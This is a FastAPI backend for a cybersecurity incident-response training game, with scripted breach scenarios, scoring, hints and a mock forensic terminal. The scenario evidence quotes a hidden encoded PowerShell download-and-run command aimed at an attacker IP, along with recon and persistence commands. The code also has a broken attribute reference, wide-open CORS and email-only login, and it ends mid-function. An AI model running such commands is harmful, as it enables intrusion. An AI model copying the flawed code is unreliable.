import os
import json
from datetime import datetime
from typing import List, Dict, Any, Optional
from fastapi import FastAPI, HTTPException, Depends
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel, Field
from sqlalchemy import create_engine, Column, Integer, String, Float, DateTime, Text, Boolean, ForeignKey
from sqlalchemy.orm import declarative_base, sessionmaker, Session, relationship

DATABASE_URL = "sqlite:///./database.db"
engine = create_engine(DATABASE_URL, connect_args={"check_same_thread": False})
SessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=engine)
Base = declarative_base()

# --- DATABASE MODELS ---
class User(Base):
    __tablename__ = "users"
    id = Column(Integer, primary_key=True, index=True)
    email = Column(String, unique=True, index=True)
    badge_id = Column(String, default="TRAINEE-01")
    level = Column(Integer, default=1)
    xp = Column(Integer, default=100)
    detection_score = Column(Float, default=70.0)
    investigation_score = Column(Float, default=65.0)
    containment_score = Column(Float, default=50.0)
    evidence_score = Column(Float, default=60.0)
    decision_score = Column(Float, default=65.0)
    communication_score = Column(Float, default=60.0)
    weakest_skill = Column(String, default="Incident Containment")
    recommended_scenario = Column(String, default="Operation Silent Login")
    created_at = Column(DateTime, default=datetime.utcnow)
    
    results = relationship("SimulationResult", back_populates="user")
    sessions = relationship("SimulationSession", back_populates="user")

class SimulationSession(Base):
    __tablename__ = "simulation_sessions"
    id = Column(Integer, primary_key=True, index=True)
    user_id = Column(Integer, ForeignKey("users.id"))
    scenario_id = Column(String, default="SCN-001")
    current_phase = Column(Integer, default=0) # 0 to 5
    threat_severity = Column(Integer, default=75) # 0 to 100
    system_health = Column(Integer, default=75) # 0 to 100
    simulated_cost = Column(Integer, default=2500)
    simulated_downtime = Column(Float, default=0.2)
    is_contained = Column(Boolean, default=False)
    is_failed = Column(Boolean, default=False)
    is_completed = Column(Boolean, default=False)
    discovered_evidence = Column(Text, default="[]") # JSON list of IDs
    decision_history = Column(Text, default="[]") # JSON list of objects
    terminal_history = Column(Text, default="[]") # JSON list
    hints_used = Column(Integer, default=0)
    elapsed_seconds = Column(Integer, default=0)
    created_at = Column(DateTime, default=datetime.utcnow)
    updated_at = Column(DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)

    user = relationship("User", back_populates="sessions")

class SimulationResult(Base):
    __tablename__ = "simulation_results"
    id = Column(Integer, primary_key=True, index=True)
    user_id = Column(Integer, ForeignKey("users.id"))
    user_email = Column(String)
    scenario_id = Column(String)
    scenario_title = Column(String)
    outcome = Column(String) # Excellent Containment, Partial, Poor, Critical Failure
    overall_score = Column(Integer)
    detection_score = Column(Integer)
    investigation_score = Column(Integer)
    containment_score = Column(Integer)
    evidence_score = Column(Integer)
    decision_score = Column(Integer)
    communication_score = Column(Integer)
    downtime_hours = Column(Float)
    financial_cost = Column(Integer)
    records_leaked = Column(Integer)
    mttr_seconds = Column(Integer)
    hints_used = Column(Integer)
    decisions_audit = Column(Text) # JSON
    weakness_identified = Column(String)
    next_recommended_drill = Column(String)
    created_at = Column(DateTime, default=datetime.utcnow)

    user = relationship("User", back_populates="results")

Base.metadata.create_all(bind=engine)

def get_db():
    db = SessionLocal()
    try:
        yield db
    finally:
        db.close()

app = FastAPI(title="Incident Response Simulator")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# --- DETERMINISTIC SCENARIO ENGINE DEFINITION ---
SCENARIOS_CATALOG = {
    "SCN-001": {
        "id": "SCN-001",
        "title": "Operation Silent Login",
        "organization": "FinSecure Technologies Ltd.",
        "difficulty": "Intermediate",
        "incident_type": "Simulated Credential Compromise & Lateral Movement",
        "baseline_timeline": [
            {"time": "09:12 UTC", "desc": "12 failed authentication attempts against user 'jdoe@finsecure.com' via external proxy."},
            {"time": "09:15 UTC", "desc": "Successful RDP logon (Event ID 4624 Type 10) negotiated via NTLMv2 from foreign ASN 14061 (185.220.101.4)."},
            {"time": "09:17 UTC", "desc": "Encoded PowerShell execution spawned from w3wp.exe (PID 4821) attempting remote staging."},
            {"time": "09:20 UTC", "desc": "Reconnaissance commands executed: whoami /groups, net user /domain, nltest /dclist."},
            {"time": "09:24 UTC", "desc": "LSASS memory handle requested; persistent service 'UpdateHealthSvc' created targeting local NAS backup."},
            {"time": "09:28 UTC", "desc": "Outbound 4.8MB encrypted socket burst over TLS v1.3 to 185.220.101.4:443."}
        ],
        "evidence_store": {
            "ev_auth": {
                "id": "ev_auth",
                "name": "Windows Authentication Logs (Event 4624/4625)",
                "category": "Authentication",
                "tech": "Event ID 4625 (Failure Reason: %%2313 Unknown Username or Bad Password) x12 from 185.220.101.4 between 09:12:01 and 09:14:50. Event ID 4624 Logon Type 10 (RemoteInteractive) at 09:15:20 UTC.",
                "plain": "An unauthorized party attempted 12 incorrect passwords in 3 minutes before gaining remote desktop access into John Doe's work profile.",
                "ioc": "185.220.101.4 [DigitalOcean ASN 14061, Bucharest, Romania]"
            },
            "ev_proc": {
                "id": "ev_proc",
                "name": "Sysmon Endpoint Process Execution Tree",
                "category": "Endpoint EDR",
                "tech": "Parent: w3wp.exe (PID 2104) -> powershell.exe (PID 4821) -NoP -NonI -W Hidden -Enc SUVY(New-Object Net.WebClient).DownloadString('https://185.220.101.4/stage.ps1').",
                "plain": "The web server software was hijacked to silently launch a hidden PowerShell script pulling a remote payload from the attacker server.",
                "ioc": "SHA256: d8f4c2e68a3064e6ec4c311c1d6832dbfae431e15b5df8083818e19e917dcb6f"
            },
            "ev_net": {
                "id": "ev_net",
                "name": "Network Socket & Zeek Conn Telemetry",
                "category": "Network Traffic",
                "tech": "Persistent TCP socket established 10.240.12.8:49211 -> 185.220.101.4:443 (4.8MB sent, 12KB received). TLS SNI: c2-stage-finsecure.xyz using untrusted self-signed certificate.",
                "plain": "The computer is maintaining a continuous encrypted connection transmitting compressed company files out to an unknown foreign host.",
                "ioc": "Domain: c2-stage-finsecure.xyz (Registered 48 hours ago)"
            },
            "ev_user": {
                "id": "ev_user",
                "name": "Active Directory User Workstation Baseline",
                "category": "Identity Context",
                "tech": "Account: John Doe (Senior Financial Analyst). Assigned device: FIN-LAPTOP-04. Normal work hours: 09:00 - 18:00 EST (Atlanta, GA). Current active session initiated from Linux host UA at 04:15 EST.",
                "plain": "John works normal business hours from Atlanta, Georgia. This login occurred at 4 AM local time from an unrecognized Linux system.",
                "ioc": "Impossible Travel Flag: Atlanta -> Bucharest within 18 minutes"
            }
        },
        "phases": [
            {
                "phase_index": 0,
                "label": "Phase 1: Alert Triage & Initial Authentication Spike (09:12 - 09:15 UTC)",
                "context_tech": "SIEM correlates Event 4625 brute-force cluster followed by successful Logon Type 10 from 185.220.101.4 on FIN-GATEWAY-01. What is your initial investigative triage action?",
                "context_plain": "A high-priority alert warns that someone failed 12 passwords and then successfully logged into John Doe's computer from another country. What should we do first?",
                "options": [
                    {
                        "id": "opt_triage_logs",
                        "label_tech": "Investigate Authentication Logs & User Geolocation Baseline",
                        "label_plain": "Inspect login history and check John Doe's usual work location",
                        "type": "investigation",
                        "unlocked_evidence": ["ev_auth", "ev_user"],
                        "score_impact": {"detection": 15, "investigation": 20, "containment": 5, "evidence": 15, "decision": 15, "comm": 10},
                        "threat_delta": -5,
                        "health_delta": 0,
                        "cost_delta": 1500,
                        "downtime_delta": 0.0,
                        "outcome_tech": "Evidence confirmed: 12 failed attempts followed by foreign NTLM replay. Attacker actively maintaining remote interactive shell.",
                        "outcome_plain": "You confirmed this is a real intruder. You discovered authentication logs and verified John is asleep in the US."
                    },
                    {
                        "id": "opt_immediate_revoke",
                        "label_tech": "Revoke Azure AD Sessions, Reset Password & Purge Kerberos TGT",
                        "label_plain": "Immediately kick the user account out and force a password reset",
                        "type": "containment",
                        "unlocked_evidence": ["ev_auth"],
                        "score_impact": {"detection": 15, "investigation": 10, "containment": 25, "evidence": 10, "decision": 20, "comm": 10},
                        "threat_delta": -25,
                        "health_delta": 10,
                        "cost_delta": 3000,
                        "downtime_delta": 0.2,
                        "outcome_tech": "Optimal Containment: Session tokens revoked via Microsoft Graph API. Adversary interactive socket severed within 40 seconds.",
                        "outcome_plain": "Great rapid response! The attacker's connection was severed before they could install deep backdoors."
                    },
                    {
                        "id": "opt_ignore_alert",
                        "label_tech": "Suppress Alert as False Positive (Assume International Travel)",
                        "label_plain": "Ignore the alarm assuming John is on vacation in Europe",
                        "type": "failure",
                        "unlocked_evidence": [],
                        "score_impact": {"detection": 5, "investigation": 0, "containment": -30, "evidence": 0, "decision": -30, "comm": 0},
                        "threat_delta": 30,
                        "health_delta": -35,
                        "cost_delta": 65000,
                        "downtime_delta": 6.0,
                        "outcome_tech": "Catastrophic Hesitation: Threat actor spawned encoded PowerShell payload and began dumping local SAM and memory hashes.",
                        "outcome_plain": "Disaster! While you ignored the alert, the intruder began executing malicious scripts on the computer."
                    }
                ]
            },
            {
                "phase_index": 1,
                "label": "Phase 2: Process Execution & Persistence Staging (09:17 - 09:20 UTC)",
                "context_tech": "EDR sensor flags Sysmon Event 1: Encoded PowerShell spawned by w3wp.exe establishing C2 beacon. Attacker querying domain administrators. Choose containment action:",
                "context_plain": "The intruder is running hidden scripts trying to find passwords and locate other company machines. How do we respond?",
                "options": [
                    {
                        "id": "opt_edr_isolate",
                        "label_tech": "Enforce EDR Network Isolation (Preserve RFC 3227 Volatile RAM)",
                        "label_plain": "Isolate the computer from the network but keep power ON to preserve memory",
                        "type": "containment",
                        "unlocked_evidence": ["ev_proc", "ev_net"],
                        "score_impact": {"detection": 20, "investigation": 20, "containment": 30, "evidence": 25, "decision": 25, "comm": 15},
                        "threat_delta": -35,
                        "health_delta": 25,
                        "cost_delta": 4500,
                        "downtime_delta": 0.5,
                        "outcome_tech": "NIST SP 800-61r2 Standard Met: Workstation quarantined from LAN/WAN. C2 connection severed. Memory dump preserved for forensics.",
                        "outcome_plain": "Masterful containment! The infected machine is cut off from the network so it cannot touch others, and RAM evidence is saved."
                    },
                    {
                        "id": "opt_hard_shutdown",
                        "label_tech": "Execute Hard Power Cut (Pull Physical Power Cord / Hard Reset)",
                        "label_plain": "Yank the power cord from the wall to instantly shut the machine down",
                        "type": "evidence_loss",
                        "unlocked_evidence": [],
                        "score_impact": {"detection": 15, "investigation": 5, "containment": 15, "evidence": -20, "decision": -10, "comm": 5},
                        "threat_delta": -15,
                        "health_delta": -20,
                        "cost_delta": 42000,
                        "downtime_delta": 4.5,
                        "outcome_tech": "Forensic Destruction: Volatile RAM erased. Injected C2 payload lost. Secondary scheduled task persistence on NAS unverified.",
                        "outcome_plain": "Mistake! Pulling the plug killed the attack, but completely erased RAM memory so you cannot prove what files were taken."
                    },
                    {
                        "id": "opt_passive_sniff",
                        "label_tech": "Passively Monitor Attacker to Trace Remote C2 IP Infrastructure",
                        "label_plain": "Wait and watch what the hacker does to learn their methods",
                        "type": "failure",
                        "unlocked_evidence": ["ev_net"],
                        "score_impact": {"detection": 10, "investigation": 10, "containment": -35, "evidence": 5, "decision": -25, "comm": 0},
                        "threat_delta": 35,
                        "health_delta": -40,
                        "cost_delta": 110000,
                        "downtime_delta": 10.0,
                        "outcome_tech": "Data Loss Event: Attacker staged sensitive banking archives and exfiltrated 4.8MB of wire transfer secrets over port 443.",
                        "outcome_plain": "Critical error! The attacker stole 42,000 confidential banking customer records while you were waiting."
                    }
                ]
            }
        ]
    },
    "SCN-002": {
        "id": "SCN-002",
        "title": "Operation CloudTrail Breach",
        "organization": "FinSecure Cloud Architecture",
        "difficulty": "Advanced",
        "incident_type": "AWS IAM Token Compromise & S3 Mass Exfiltration",
        "baseline_timeline": [
            {"time": "11:02 UTC", "desc": "Compromised AWS access key AKIAIOSFODNN7 used from unauthorized Tor Exit Node."},
            {"time": "11:05 UTC", "desc": "S3 GetObject rate spike (450 req/sec) targeting bucket 'prod-customer-vault-finsecure'."},
            {"time": "11:08 UTC", "desc": "AWS GuardDuty triggers UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration."}
        ],
        "evidence_store": {
            "ev_cloud": {
                "id": "ev_cloud",
                "name": "AWS CloudTrail Event Logs",
                "category": "Cloud Audit",
                "tech": "Event: AssumeRole from sourceIP 198.51.100.22 (Tor Relay) invoking s3:GetObject across 84,000 files in us-east-1.",
                "plain": "An unauthorized party used leaked cloud access keys to bulk-download confidential customer files.",
                "ioc": "AccessKeyId: AKIAIOSFODNN7EXAMPLE"
            }
        },
        "phases": [
            {
                "phase_index": 0,
                "label": "Phase 1: Cloud IAM Access Revocation",
                "context_tech": "Leaked IAM programmatic key streaming sensitive S3 objects out of us-east-1. Immediate cloud containment required:",
                "context_plain": "A stolen cloud key is downloading files from the company database. What is your cloud response?",
                "options": [
                    {
                        "id": "opt_cloud_revoke",
                        "label_tech": "Attach Inline DenyAll SCP & Invalidate Active STS Role Sessions",
                        "label_plain": "Revoke the access key and invalidate all active cloud login tokens immediately",
                        "type": "containment",
                        "unlocked_evidence": ["ev_cloud"],
                        "score_impact": {"detection": 20, "investigation": 20, "containment": 35, "evidence": 20, "decision": 25, "comm": 15},
                        "threat_delta": -40,
                        "health_delta": 25,
                        "cost_delta": 4000,
                        "downtime_delta": 0.1,
                        "outcome_tech": "Containment Verified: STS credentials revoked. Exfiltration halted after 4% bucket volume.",
                        "outcome_plain": "Excellent! The leaked cloud keys were revoked within seconds, halting the exfiltration."
                    },
                    {
                        "id": "opt_delete_bucket",
                        "label_tech": "Delete S3 Bucket to Halt Outbound Data Flow",
                        "label_plain": "Delete the entire company database bucket to stop them reading files",
                        "type": "failure",
                        "unlocked_evidence": [],
                        "score_impact": {"detection": 15, "investigation": 5, "containment": -25, "evidence": -30, "decision": -35, "comm": 5},
                        "threat_delta": 10,
                        "health_delta": -60,
                        "cost_delta": 180000,
                        "downtime_delta": 24.0,
                        "outcome_tech": "Catastrophic Service Destruction: Entire production database destroyed. Recovery requires 24 hours of cold backup restores.",
                        "outcome_plain": "Disaster! You stopped the theft, but permanently destroyed the production banking database."
                    }
                ]
            }
        ]
    }
}

# --- API SCHEMAS ---
class AuthRequest(BaseModel):
    email: str
    badge_id: Optional[str] = "TRAINEE-01"

class StartScenarioRequest(BaseModel):
    email: str
    scenario_id: str

class DecisionActionRequest(BaseModel):
    session_id: int
    option_id: str

class TerminalExecRequest(BaseModel):
    session_id: int
    command: str

class HintRequest(BaseModel):
    session_id: int
    tier: int # 1, 2, or 3

@app.get("/", response_class=HTMLResponse)
async def serve_index():
    path = os.path.join(os.path.dirname(__file__), "templates", "index.html")
    if os.path.exists(path):
        with open(path, "r", encoding="utf-8") as f:
            return HTMLResponse(content=f.read())
    return HTMLResponse(content="<h3>templates/index.html not found</h3>", status_code=404)

# --- USER PROFILE & AUTHENTICATION (DEMO TRAINING PROFILE) ---
@app.post("/api/auth/login")
def login_operator(req: AuthRequest, db: Session = Depends(get_db)):
    clean_email = req.email.strip().lower()
    if not clean_email or "@" not in clean_email:
        raise HTTPException(status_code=400, detail="A valid email address is required for profile tracking.")

    user = db.query(User).filter(User.email == clean_email).first()
    if not user:
        user = User(
            email=clean_email,
            badge_id=req.badge_id or "TRAINEE-01",
            level=1,
            xp=250,
            detection_score=70.0,
            investigation_score=65.0,
            containment_score=52.0,
            evidence_score=60.0,
            decision_score=65.0,
            communication_score=60.0,
            weakest_skill="Incident Containment",
            recommended_scenario="Operation Silent Login"
        )
        db.add(user)
        db.commit()
        db.refresh(user)

    # Calculate statistics from actual user simulation runs
    results = db.query(SimulationResult).filter(SimulationResult.user_id == user.id).all()
    completed_count = len(results)
    avg_score = round(sum(r.overall_score for r in results) / completed_count, 1) if completed_count > 0 else 0.0
    best_score = max([r.overall_score for r in results], default=0)

    # Check for in-progress session
    active_session = db.query(SimulationSession).filter(
        SimulationSession.user_id == user.id,
        SimulationSession.is_completed == False
    ).first()

    return {
        "email": user.email,
        "badge_id": user.badge_id,
        "level": user.level,
        "xp": user.xp,
        "skills": {
            "threat_detection": user.detection_score,
            "investigation": user.investigation_score,
            "containment": user.containment_score,
            "evidence_handling": user.evidence_score,
            "decision_making": user.decision_score,
            "communication": user.communication_score
        },
        "weakest_skill": user.weakest_skill,
        "recommended_scenario": user.recommended_scenario,
        "stats": {
            "completed_simulations": completed_count,
            "average_score": avg_score,
            "best_score": best_score,
            "has_active_session": active_session is not None,
            "active_session_id": active_session.id if active_session else None
        }
    }

# --- SCENARIOS CATALOG ---
@app.get("/api/scenarios")
def get_scenarios():
    return [
        {
            "id": scn["id"],
            "title": scn["title"],
            "organization": scn["organization"],
            "difficulty": scn["difficulty"],
            "incident_type": scn["incident_type"],
            "phase_count": len(scn["phases"]),
            "timeline": scn["baseline_timeline"]
        }
        for scn in SCENARIOS_CATALOG.values()
    ]

# --- START / RESUME SIMULATION SESSION ---
@app.post("/api/simulations/start")
def start_simulation(req: StartScenarioRequest, db: Session = Depends(get_db)):
    clean_email = req.email.strip().lower()
    user = db.query(User).filter(User.email == clean_email).first()
    if not user:
        raise HTTPException(status_code=404, detail="User not found.")

    if req.scenario_id not in SCENARIOS_CATALOG:
        raise HTTPException(status_code=400, detail="Scenario ID not found.")

    # Invalidate old incomplete sessions
    db.query(SimulationSession).filter(
        SimulationSession.user_id == user.id,
        SimulationSession.is_completed == False
    ).delete()

    new_session = SimulationSession(
        user_id=user.id,
        scenario_id=req.scenario_id,
        current_phase=0,
        threat_severity=76,
        system_health=74,
        simulated_cost=2500,
        simulated_downtime=0.2,
        is_contained=False,
        is_failed=False,
        is_completed=False,
        discovered_evidence=json.dumps([]),
        decision_history=json.dumps([]),
        terminal_history=json.dumps([
            "SIMULATED FORENSIC CLI READY // Connected to FIN-GATEWAY-01 (10.240.12.8)",
            "Simulation Mode: Type 'help', 'netstat -ano', 'ps aux', 'history', or 'isolate-host'"
        ]),
        hints_used=0,
        elapsed_seconds=0
    )
    db.add(new_session)
    db.commit()
    db.refresh(new_session)

    return get_session_state(new_session)

@app.get("/api/simulations/session/{session_id}")
def get_session(session_id: int, db: Session = Depends(get_db)):
    session = db.query(SimulationSession).filter(SimulationSession.id == session_id).first()
    if not session:
        raise HTTPException(status_code=404, detail="Session not found.")
    return get_session_state(session)

def get_session_state(session: SimulationSession) -> Dict[str, Any]:
    scn = SCENARIOS_CATALOG[session.scenario_id]
    discovered_ids = json.loads(session.discovered_evidence)
    decisions = json.loads(session.decision_history)
    terminal_lines = json.loads(session.terminal_history)
    
    # Filter only discovered evidence
    active_evidence = [
        scn["evidence_store"][ev_id] for ev_id in discovered_ids if ev_id in scn["evidence_store"]
    ]

    current_phase_data = None
    if session.current_phase < len(scn["phases"]) and not session.is_completed:
        current_phase_data = scn["phases"][session.current_phase]

    return {
        "session_id": session.id,
        "scenario_id": session.scenario_id,
        "scenario_title": scn["title"],
        "organization": scn["organization"],
        "difficulty": scn["difficulty"],
        "incident_type": scn["incident_type"],
        "current_phase": session.current_phase,
        "total_phases": len(scn["phases"]),
        "threat_severity": session.threat_severity,
        "system_health": session.system_health,
        "simulated_cost": session.simulated_cost,
        "simulated_downtime": session.simulated_downtime,
        "is_contained": session.is_contained,
        "is_failed": session.is_failed,
        "is_completed": session.is_completed,
        "hints_used": session.hints_used,
        "elapsed_seconds": session.elapsed_seconds,
        "active_phase_data": current_phase_data,
        "discovered_evidence": active_evidence,
        "decision_history": decisions,
        "terminal_history": terminal_lines,
        "baseline_timeline": scn["baseline_timeline"]
    }

# --- DECISION EVALUATION & CONSEQUENCE ENGINE ---
@app.post("/api/simulations/decide")
def evaluate_decision(req: DecisionActionRequest, db: Session = Depends(get_db)):
    session = db.query(SimulationSession).filter(SimulationSession.id == req.session_id).first()
    if not session or session.is_completed:
        raise HTTPException(status_code=400, detail="Simulation session invalid or already completed.")

    scn = SCENARIOS_CATALOG[session.scenario_id]
    current_phase = scn["phases"][session.current_phase]
    
    selected_option = next((opt for opt in current_phase["options"] if opt["id"] == req.option_id), None)
    if not selected_option:
        raise HTTPException(status_code=400, detail="Invalid decision option.")

    # Consequence Engine updates
    session.threat_severity = max(5, min(99, session.threat_severity + selected_option["threat_delta"]))
    session.system_health = max(5, min(99, session.system_health + selected_option["health_delta"]))
    session.simulated_cost += selected_option["cost_delta"]
    session.simulated_downtime = round(session.simulated_downtime + selected_option["downtime_delta"], 2)

    # Unlock progressive evidence
    current_discovered = json.loads(session.discovered_evidence)
    for ev_id in selected_option["unlocked_evidence"]:
        if ev_id not in current_discovered:
            current_discovered.append(ev_id)
    session.discovered_evidence = json.dumps(current_discovered)

    # Record decision audit
    decisions = json.loads(session.decision_history)
    decisions.append({
        "phase": session.current_phase + 1,
        "option_id": selected_option["id"],
        "label_tech": selected_option["label_tech"],
        "label_plain": selected_option["label_plain"],
        "outcome_tech": selected_option["outcome_tech"],
        "outcome_plain": selected_option["outcome_plain"],
        "score_impact": selected_option["score_impact"],
        "cost_delta": selected_option["cost_delta"],
        "downtime_delta": selected_option["downtime_delta"],
        "timestamp": datetime.utcnow().strftime("%H:%M:%S UTC")
    })
    session.decision_history = json.dumps(decisions)

    if selected_option["type"] == "containment":
        session.is_contained = True
    elif selected_option["type"] == "failure":
        session.is_failed = True

    # Advance phase or conclude
    if session.current_phase + 1 < len(scn["phases"]) and not session.is_failed:
        session.current_phase += 1
    else:
        # Finalize and Score Simulation
        session.is_completed = True
        finalize_simulation_run(session, db)

    db.commit()
    db.refresh(session)
    return get_session_state(session)

# --- SCORING & ADAPTIVE LEARNING EVALUATION ---
def finalize_simulation_run(session: SimulationSession, db: Session):
    user = session.user
    decisions = json.loads(session.decision_history)
    scn = SCENARIOS_CATALOG[session.scenario_id]

    # Weighted scoring algorithm totaling 100%
    # Weights: Detection 20%, Investigation 20%, Containment 25%, Evidence 15%, Decision 10%, Comm 10%
    det_pts = 70
    inv_pts = 60
    con_pts = 50
    evi_pts = 50
    dec_pts = 60
    com_pts = 60

    for d in decisions:
        impact = d["score_impact"]
        det_pts = max(0, min(100, det_pts + impact.get("detection", 0)))
        inv_pts = max(0, min(100, inv_pts + impact.get("investigation", 0)))
        con_pts = max(0, min(100, con_pts + impact.get("containment", 0)))
        evi_pts = max(0, min(100, evi_pts + impact.get("evidence", 0)))
        dec_pts = max(0, min(100, dec_pts + impact.get("decision", 0)))
        com_pts = max(0, min(100, com_pts + impact.get("comm", 0)))

    # Deduct points for hints used
    penalty = min(20, session.hints_used * 5)
    
    overall_score = round(
        (0.20 * det_pts) + (0.20 * inv_pts) + (0.25 * con_pts) + 
        (0.15 * evi_pts) + (0.10 * dec_pts) + (0.10 * com_pts) - penalty
    )
    overall_score = max(5, min(100, overall_score))

    # Determine final outcome category
    if session.is_failed or overall_score < 50:
        outcome = "Critical Failure — Simulated Data Exfiltration"
        records_leaked = 42000
    elif con_pts < 65:
        outcome = "Poor Response — Attacker Persistence"
        records_leaked = 4200
    elif evi_pts < 65:
        outcome = "Partial Containment — Forensic Evidence Missed"
        records_leaked = 0
    else:
        outcome = "Excellent Containment — Attack Neutralized"
        records_leaked = 0

    # Skill vector diagnosis
    skills = {
        "Threat Detection": det_pts,
        "Log Investigation": inv_pts,
        "Incident Containment": con_pts,
        "Evidence Handling": evi_pts,
        "Decision Making": dec_pts,
        "Incident Communication": com_pts
    }
    weakest_skill = min(skills, key=skills.get)

    if weakest_skill == "Incident Containment":
        next_drill = "Operation Silent Login — Host Isolation Drill"
    elif weakest_skill in ["Threat Detection", "Log Investigation"]:
        next_drill = "Operation CloudTrail Breach — Cloud Audit Drill"
    else:
        next_drill = "Ransomware Lateral Air-Gap Containment"

    # Save to SimulationResult audit table
    result = SimulationResult(
        user_id=user.id,
        user_email=user.email,
        scenario_id=scn["id"],
        scenario_title=scn["title"],
        outcome=outcome,
        overall_score=overall_score,
        detection_score=det_pts,
        investigation_score=inv_pts,
        containment_score=con_pts,
        evidence_score=evi_pts,
        decision_score=dec_pts,
        communication_score=com_pts,
        downtime_hours=session.simulated_downtime,
        financial_cost=session.simulated_cost,
        records_leaked=records_leaked,
        mttr_seconds=session.elapsed_seconds,
        hints_used=session.hints_used,
        decisions_audit=session.decision_history,
        weakness_identified=weakest_skill,
        next_recommended_drill=next_drill
    )
    db.add(result)

    # Update User's Persistent Profile via Adaptive Learning Formula
    user.xp += overall_score * 15
    if user.xp >= user.level * 1000:
        user.level += 1

    # Exponential moving average update (70% prior, 30% current session)
    user.detection_score = round(user.detection_score * 0.7 + det_pts * 0.3, 1)
    user.investigation_score = round(user.investigation_score * 0.7 + inv_pts * 0.3, 1)
    user.containment_score = round(user.containment_score * 0.7 + con_pts * 0.3, 1)
    user.evidence_score = round(user.evidence_score * 0.7 + evi_pts * 0.3, 1)
    user.decision_score = round(user.decision_score * 0.7 + dec_pts * 0.3, 1)
    user.communication_score = round(user.communication_score * 0.7 + com_pts * 0.3, 1)
    user.weakest_skill = weakest_skill
    user.recommended_scenario = next_drill

# --- FORENSIC CLI SIMULATION ENDPOINT ---
@app.post("/api/simulations/cli")
def execute_cli_command(req: TerminalExecRequest, db: Session = Depends(get_db)):
    session = db.query(SimulationSession).filter(SimulationSession.id == req.session_id).first()
    if not session:
        raise HTTPException(status_code=404, detail="Session not found.")

    cmd = req.command.strip().lower()
    resp = f"Command '{req.command}' not recognized in simulated host sandbox. Type 'help'."
    
    current_discovered = json.loads(session.discovered_evidence)

    if cmd == "help":
        resp = "Simulated Host Forensic Commands:\n  netstat -ano   : Inspect active network sockets\n  ps aux         : List running system processes\n  history        : View recent command prompt executions\n  isolate-host   : Trigger EDR network quarantine\n  clear          : Clear console buffer"
    elif "netstat" in cmd:
        resp = "Proto Local Address          Foreign Address        State       PID\nTCP   0.0.0.0:443            0.0.0.0:0              LISTENING   4821\nTCP   10.240.12.8:49211      185.220.101.4:443      ESTABLISHED 4821 [C2 Channel]"
        if "ev_net" not in current_discovered:
            current_discovered.append("ev_net")
    elif "ps" in cmd or "tasklist" in cmd:
        resp = "PID   COMMAND                  CPU%   MEM(MB)  STATUS\n684   lsass.exe                0.1%   28.4     SYSTEM\n2104  w3wp.exe (DefaultAppPool) 1.2%   142.1    NETWORK SERVICE\n4821  powershell.exe -Enc      89.4%  184.6    SUSPICIOUS C2 STAGER"
        if "ev_proc" not in current_discovered:
            current_discovered.append("ev_proc")
    elif cmd == "history":
        resp = "Recent shell history on FIN-GATEWAY-01:\n101 whoami /groups\n102 net user /domain\n103 nltest /dclist:FINSEC.CORP\n104 schtasks /create /tn UpdateHealthSvc /tr powershell.exe"
    elif cmd == "isolate-host":
        session.is_contained = True
        session.threat_severity = max(10, session.threat_severity - 30)
        session.system_health = min(95, session.system_health + 20)
        resp = "[EDR AGENT ACTION] FIN-GATEWAY-01 quarantined from LAN/WAN. C2 connection severed. RAM preserved."
    elif cmd == "clear":
        session.terminal_history = json.dumps(["CLI cleared."])
        db.commit()
        return {"output": "CLI cleared.", "terminal_history": ["CLI cleared."]}

    session.discovered_evidence = json.dumps(current_discovered)
    t_hist = json.loads(session.terminal_history)
    t_hist.append(f"$ {req.command}")
    t_hist.append(resp)
    session.terminal_history = json.dumps(t_hist)
    db.commit()

    return {"output": resp, "terminal_history": t_hist, "discovered_evidence": current_discovered}

# --- PROGRESSIVE 3-TIER CONTEXTUAL AI ASSISTANT ---
@app.post("/api/ai/hint")
def request_contextual_hint(req: HintRequest, db: Session = Depends(get_db)):
    session = db.query(SimulationSession).filter(SimulationSession.id == req.session_id).first()
    if not session:
        raise HTTPException(status_code=404, detail="Session not found.")

    session.hints_used += 1
    db.commit()

    # Rule-based contextual AI engine matching scenario, phase, and state
    if session.current_phase == 0:
        if req.tier == 1:
            return {"tier": 1, "hint": "General Direction: The alert involves authentication. Before making aggressive network changes, inspect who logged in and whether their location matches normal baselines."}
        elif req.tier == 2:
            return {"tier": 2, "hint": "Specific Evidence Clue: Examine the Windows Event ID 4625 brute force logs and cross-reference John Doe's normal workstation baseline in Atlanta."}
        else:
            return {"tier": 3, "hint": "Recommended Path & Tradeoff: Revoke active session tokens immediately. If you ignore the alert or wait, the attacker will begin dumping memory hashes."}
    else:
        if req.tier == 1:
            return {"tier": 1, "hint": "General Direction: The threat actor is attempting persistence across the local subnet. Your priority is containing host movement without destroying evidence."}
        elif req.tier == 2:
            return {"tier": 2, "hint": "Specific Evidence Clue: Do not pull the physical power cord. Hard power resets erase volatile RAM, violating RFC 3227 order of volatility."}
        else:
            return {"tier": 3, "hint": "Recommended Path & Tradeoff: Execute EDR network isolation. It cuts external C2 beaconing while keeping the kernel agent alive for forensic acquisition."}

# --- AUDIT REPORTS & LEADERBOARD ---
@app.get("/api/reports")
def get_reports(db: Session = Depends(get_db)):
    records = db.query(SimulationResult).order_by(SimulationResult.created_at.desc()).all()
    return [
        {
            "id": r.id,
            "user_email": r.user_email,
            "scenario_id": r.scenario_id,
            "scenario_title": r.scenario_title,
            "outcome": r.outcome,
            "overall_score": r.overall_score,
            "detection_score": r.detection_score,
            "investigation_score": r.investigation_score,
            "containment_score": r.containment_score,
            "evidence_score": r.evidence_score,
            "decision_score": r.decision_score,
            "communication_score": r.communication_score,
            "downtime_hours": r.downtime_hours,
            "financial_cost": r.financial_cost,
            "records_leaked": r.records_leaked,
            "mttr_seconds": r.mttr_seconds,
            "hints_used": r.hints_used,
            "decisions_audit": json.loads(r.decisions_audit) if r.decisions_audit else [],
            "weakness": r.weakness_identified,
            "next_drill": r.next_drill_recommendation,
            "date": r.created_at.strftime("%Y-%m-%d %H:%M UTC")
        }
        for r in records
    ]

@app.get("/api/leaderboard")
def get_leaderboard(db: Session = Depends(get_db)):
    users = db.query(User).order_by(User.xp.desc()).limit(10).all()
    return [
        {
            "rank": idx + 1,
            "email": u.email,
            "badge_id": u.badge_id,
            "level": u.level,
            "xp": u.xp,
            "containment_score": u.containment_score,
            "weakest_skill": u.weakest_skill
